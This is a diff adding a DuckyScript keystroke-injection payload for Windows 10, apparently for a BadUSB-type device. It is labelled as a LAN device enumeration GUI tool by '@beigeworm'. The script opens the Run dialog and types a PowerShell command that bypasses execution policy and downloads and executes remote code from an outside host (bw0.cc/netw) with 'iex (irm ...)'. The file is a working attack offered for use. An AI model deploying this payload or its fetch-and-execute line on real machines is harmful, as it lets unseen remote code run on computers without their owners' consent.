@@ -1,0 +1,13 @@
+REM Title: beigeworm's LAN Device Enumeration GUI Tool.
+REM Author: @beigeworm
+REM Description: This script creates a GUI for enumerating devices on the local network.
+REM Target: Windows 10
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/netw)
+ENTER
+
+
